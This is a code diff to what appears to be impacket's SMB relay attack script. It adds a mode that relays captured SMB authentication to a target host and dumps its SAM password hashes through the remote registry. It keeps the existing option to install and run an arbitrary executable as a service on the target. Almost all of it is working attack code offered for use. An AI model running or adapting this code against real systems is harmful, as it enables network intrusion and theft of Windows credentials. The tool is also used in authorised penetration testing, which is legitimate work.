@@ -42,7 +42,7 @@ from threading import Thread
 from binascii import unhexlify, hexlify
 
 from impacket.examples import logger
-from impacket import version
+from impacket import version, smb3
 from impacket.examples import serviceinstall
 from impacket.smb import *
 from impacket.smbserver import *
@@ -50,6 +50,7 @@ from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5 import nrpc
 from impacket.dcerpc.v5.ndr import NULL
 from impacket.spnego import ASN1_AID
+from impacket.smbconnection import SMBConnection
 
 try:
  from Crypto.Cipher import DES, AES, ARC4
@@ -60,14 +61,41 @@ except Exception:
 class doAttack(Thread):
     def __init__(self, SMBClient, exeFile):
         Thread.__init__(self)
-        self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
+
+        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
+            self.__SMBConnection = SMBConnection(existingConnection = SMBClient)
+        else:
+            self.__SMBConnection = SMBClient
+
+        self.__exeFile = exeFile
+        if exeFile is not None:
+            self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
+
 
     def run(self):
         # Here PUT YOUR CODE!
-        result = self.installService.install()
-        if result is True:
-            logging.info("Service Installed.. CONNECT!")
-            self.installService.uninstall()
+        if self.__exeFile is not None:
+            result = self.installService.install()
+            if result is True:
+                logging.info("Service Installed.. CONNECT!")
+                self.installService.uninstall()
+        else:
+            from secretsdump import RemoteOperations, SAMHashes
+            samHashes = None
+            try:
+                remoteOps  = RemoteOperations(self.__SMBConnection)
+                remoteOps.enableRegistry()
+                bootKey = remoteOps.getBootKey()
+                samFileName = remoteOps.saveSAM()
+                samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                samHashes.dump()
+                logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+            except Exception, e:
+                logging.error(str(e))
+            finally:
+                if samHashes is not None:
+                    samHashes.finish()
+
 
 class SMBClient(smb.SMB):
     def __init__(self, remote_name, extended_security = True, sess_port = 445):
@@ -773,7 +801,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
-    parser.add_argument('-e', action='store', required=True, metavar = 'FILE', help='File to execute on the target system')
+    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes would will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
